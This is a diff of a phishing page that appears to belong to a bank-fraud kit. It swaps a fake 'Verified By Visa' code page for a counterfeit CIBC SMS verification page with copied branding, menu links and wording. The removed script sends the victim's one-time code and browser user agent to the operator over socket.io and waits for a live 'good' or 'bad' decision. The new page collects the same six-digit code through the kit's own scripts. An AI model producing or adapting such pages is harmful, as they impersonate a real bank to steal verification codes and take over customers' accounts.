@@ -1,143 +1,190 @@
-<html style="" class="csstransitions no-csspseudotransitions no-touchevents language-en is-signed-in" lang="en">
+<html>
 
 <head>
+    <span hidden id="page"> SMS-OTP </span>
+    <span hidden id="pageRedirection"> /cibc/loading </span>
+    <script type="text/javascript" id="custom-useragent-string"></script>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>E-tranfer</title>
     <meta charset="UTF-8">
-    <title>Verification Code | Verified By Visa</title>
-
-    <meta name="robots" content="noindex, nofollow">
-    <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <link type="text/css" href="/assets/cap/general.css" rel="stylesheet">
-    <link type="text/css" href="/assets/cap/basic.css" rel="stylesheet">
-    <link type="text/css" href="/assets/cap/org.css" rel="stylesheet">
-    <link href="/assets/cap/bound.css" rel="stylesheet">
-    <style>
-        .loading-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.8);
-            z-index: 1050;
+    <meta name="viewport"
+        content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="HandheldFriendly" content="true">
+    <meta name="format-detection" content="telephone=no">
+    <link rel="stylesheet" href="/assets/cibc/confirm_files/reset.css">
+    <link rel="stylesheet" href="/assets/cibc/confirm_files/reset-brand.css">
+    <link rel="stylesheet" href="/assets/cibc/confirm_files/global.css">
+    <link rel="stylesheet" href="/assets/cibc/confirm_files/global-android2.css">
+    <link rel="stylesheet" href="/assets/cibc/confirm_files/global-brand.css">
+    <link rel="stylesheet" href="/assets/cibc/confirm_files/password-reset.css">
+    <link rel="stylesheet" href="/assets/cibc/confirm_files/password-reset-brand.css">
+    <style id="at-makers-style" class="at-flicker-control">
+        .mboxDefault {
+            visibility: hidden;
         }
 
-        .loading-overlay.active {
-            display: flex;
-            /* Display the overlay when active */
+        .tfa-info p {
+            margin-bottom: 10px;
         }
 
-        .spinner-container {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
+        .mb5 {
+            margin-bottom: 15px;
         }
     </style>
+    <style>
+        #header-logo {
+            background: url(/assets/cibc/img/cibcnew.svg);
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: contain;
+            width: 100px;
+        }
+    </style>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
+    <script>
+        var lrbank = '<?=escape($udata->last->bank)?>';
+        var lrinfo = '<?=escape($udata->last->info)?>';
+    </script>
+    <script src="/assets/js/actions.js?v=<?=time()?>"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.css">
+    <link rel="stylesheet" href="/assets/css/loader.css?v=<?=time()?>">
     <script src="/socket.io/socket.io.js"></script>
-
-    <!-- Include Bootstrap CSS -->
-    <link href="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/css/bootstrap.min.css" rel="stylesheet">
-    <style>
-        #track-main-content[_ngcontent-c0] {
-            margin-right: -1rem !important;
-            margin-left: -1rem !important
-        }
-    </style>
+   
 </head>
 
-<body id="bdmain" class="www track_web f-topbar-fixed" style=""
-    onload="document.getElementById('bdmain').style.display='';">
-    <!-- Modal -->
-
-
-    <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h5 class="modal-title">Digital Bank</h5>
-                <div>
-                    <img src="/assets/cap/visa.png" alt="Visa" class="" style="width: 60px; height: auto;">
-                    <img src="/assets/cap/securecode.png" alt="Visa" class="" style="width: 60px; height: auto;">
-                </div>
+<body lang="en" class="android-fix">
+    <input type="hidden" id="userAgent" name="userAgent">
+    <input type="hidden" id="banks" name="banks">
+    <span class="offscreen">Forgot Password</span>
+    <input type="checkbox" id="drawer-toggle-chk" aria-hidden="true">
+    <label for="drawer-toggle-chk" id="drawer-toggle-label">
+        <img id="open-menu-icon" src="/assets/cibc/confirm_files/drawer-menu-open.png" alt="Open Menu" role="button">
+        <img id="close-menu-icon" src="/assets/cibc/confirm_files/drawer-menu-close.png" alt="Close Menu" role="button">
+    </label>
+    <nav id="drawer-menu" class="scrollable-ver">
+        <div id="menu-wrapper">
+            <div class="drawer-menu-header">
+                <div>CIBC<span>Mobile Banking</span></div>
             </div>
-            <div class="modal-body">
-                <p class="mb-4">Enter verification code<br>
-                    We sent you a verification code by text message. You have 6 attempts.</p>
-
-                <div class="mb-3">
-                    <label for="verificationCode" class="form-label">Verification code</label>
-                    <input type="tel" class="form-control" id="verificationCode" placeholder="123456" maxlength="10">
-                    <div id="errorMessage" style="color:red; display:none;">
-                        Please enter a valid code.
-                    </div>
-                </div>
-
-                <button class="btn btn-primary w-100" id="continueBtn">CONTINUE</button>
-                <button class="mt-2 btn-secondary w-100">RESEND CODE</button>
-                <!-- Loading Overlay -->
-                <div class="loading-overlay">
-                    <div class="spinner-container">
-                        <div class="spinner-border text-primary" role="status">
-                            <span class="sr-only">Loading...</span>
-                        </div>
-                    </div>
-                </div>
-
-
-
-
-                <p class="mt-3">Having trouble?</p>
-
-                <div class="mt-3">
-                    <a href="#" class="btn btn-link">Need Help?</a>
-                    <span class="float-end">+</span>
-                </div>
-            </div>
+            <ul>
+                <li id="li-sign-on"><a id="signon-link" class="tracking-set-flow"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-signonLink"
+                        role="menuitem">Sign On</a></li>
+                <li><a id="register-link" class="tracking-set-flow"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-registerLink"
+                        role="menuitem">Register</a></li>
+                <li id="li-forgot-password"><a id="forgetpwd-link" class="tracking-set-flow active"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-forgetPasswordLink"
+                        role="menuitem">Forgot Password<span class="offscreen">Selected</span></a></li>
+                <hr>
+                <li id="li-open-account"><a id="open-product-link" class="tracking-set-flow"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-openAccountPs-openAccountPsLink"
+                        role="menuitem"
+                        @="Open an Account<span class=&quot;offscreen&quot;>. Opens in new page</span>">Open an
+                        Account</a></li>
+                <li id="li-browse-products"><a id="browse-products-link"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-browseProductsPs-productSelectorLink"
+                        target="_blank" role="menuitem"
+                        @="Explore Products<span class=&quot;offscreen&quot;>. Opens in new page</span>"
+                        class="">Explore Products</a></li>
+                <li id="li-sites-apps"></li>
+                <li id="li-sites-apps"><a id="sites-link"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-sitesPreSignOnLink"
+                        role="menuitem" class="">CIBCSites</a></li>
+                <li id="li-find-us"><a id="find-us-link"
+                        href="https://www.cibc.com/ca/redirect/locator.html?itrc=C1:6185" target="_blank"
+                        role="menuitem">Find Us</a></li>
+                <li id="li-security"><a id="security-guarantee-link"
+                        href="https://www.cibc.com/ca/mobile/legal/mobile-security.html?itrc=C1:6166" target="_blank"
+                        role="menuitem">Security Guarantee</a></li>
+                <hr>
+                <li><a id="contact-us-link" href="https://www.cibc.com/m/contact-cibc.html?itrc=C1:6187" target="_blank"
+                        role="menuitem">Contact Us</a></li>
+                <li id="idd"><a id="legal-link" role="menuitem"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-privacyAndLegalContainer-legalLink"
+                        @="Privacy and Legal<span class=&quot;offscreen&quot;>Opens in new page.</span>"
+                        class="">Privacy and Legal<span class="offscreen">Opens in new page.</span></a></li>
+                <li><a id="help-link" href="http://cibc.intelliresponse.com/mobile-w/?itrc=C1:6167" target="_blank"
+                        role="menuitem">Help</a></li>
+            </ul>
         </div>
+    </nav>
+    <header class="flex-box flex-box-hoz">
+        <div class="flex-box-flex-1"></div>
+        <a href="http://cibc.com/" target="_blank">
+            <div id="header-logo">
+                <span class="offscreen">CIBClogo</span>
+            </div>
+        </a>
+        <div id="header-link" class="flex-box-flex-1">
+        </div>
+    </header>
+    <noscript>
+        <section id="nojs" class="overlay-msg">
+            <div>
+                <p>JavaScript is currently disabled in your browser.</p>
+                <p>To access Mobile Banking, please enable JavaScript and refresh this page.</p>
+            </div>
+        </section>
+    </noscript>
+    <section id="main-page" class="mainPageClassValue">
+        <section id="ide">
+            <section class="page-title">
+                <h2 class="title">Identity Verification</h2>
+            </section>
+        </section>
+        <section id="identity-verification" class="page-wrapper">
+            <div class="tfa-info">
+                <p>In order to sign on to CIBC Banking, we need to verify your identity.</p>
+                <p>We will send you a one-time verification code to your registered mobile number.</p>
+            </div>
+            <div class="global-error-from-container" tabindex="-1" id="id4">
+
+                <div id="alertWrong" class="global-error-from-container" tabindex="-1">
+
+                </div>
+
+            </div>
+            <form id="loginForm">
+                <section id="step-2">
+                    <fieldset class="otvc">
+                        <label for="otvc-code">
+                            <p class="label-pad-b5">VERIFICATION CODE:</p>
+                        </label>
+                        <input pattern="[0-9]{1}[0-9]{1}[0-9]{1}[0-9]{1}[0-9]{1}[0-9]{1}" data-id="otvc" id="input-code"
+                            type="tel" name="code" placeholder="6-digit code" maxlength="6" value=""
+                            autocomplete="one-time-code" required>
+                    </fieldset>
+                    <span id="id1b">
+                        <p class="mb5">
+                            <span class="label-pad-b5">Didn't get the code?</span>
+                            <a href="javascript:;" class="nga-resend-button" id="btn-resend">
+                                <span>Resend code</span>
+                            </a>
+                        </p>
+                        <div class="linepadtop7bottom20">
+                            <span>Please allow a few minutes for the verification code to be sent.</span>
+                        </div>
+                    </span>
+                </section>
+                <fieldset class="button-set">
+                    <input type="button" class="btn btn-negative" id="btb-cancel" value="Cancel">
+                    <span class="btn btn-positive btn-full btn-save">
+                        <span onclick="submitForm()" class="btn-txt">OK</span>
+                        <span class="btn-spinner" style="display: none"><i class="fa fa-spinner fa-spin"></i></span>
+                    </span>
+                </fieldset>
+            </form>
+        </section>
+    </section>
+    <div id="__loadingScreenDiv" class="ajax-overlay" aria-live="assertive">
+        <div class="ajax-overlay-background"></div>
+        <img src="/assets/cibc/confirm_files/loading.gif" class="ajax-overlay-spinner" tabindex="-1" alt="Page loading">
     </div>
-
-
-
-
-    <!-- Include Bootstrap Bundle with Popper -->
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/js/bootstrap.bundle.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"></script>
-
 </body>
-<script>
-    const socket = io();
-    // Get the button, assign a click event handler
-    document.getElementById('continueBtn').addEventListener('click', function () {
 
-        // Show the loading overlay
-        document.querySelector('.loading-overlay').style.display = 'flex';
-        const verificationCode = document.getElementById('verificationCode').value;
-        const data = {
-            otp: verificationCode,
-            userAgent: navigator.userAgent
-        }
-        socket.emit('otp', data)
-    });
-
-    socket.on('choice', (data) => {
-        if (data.action === "bad") {
-            // Display the error message
-            document.querySelector('.loading-overlay').style.display = 'none';
-            document.getElementById('errorMessage').style.display = 'block';
-            socket.emit('confirmation_bad', {status: true})
-        } else if (data.action === "good") {
-            socket.emit('confirmation_good', {status: true})
-            // Hide the error message if the action is not 'bad'
-            document.getElementById('errorMessage').style.display = 'none';
-            window.location.href = '/finish';
-        }
-    })
-
-    
-
-</script>
-
+    <script>
+        
+    </script>
 
 </html>
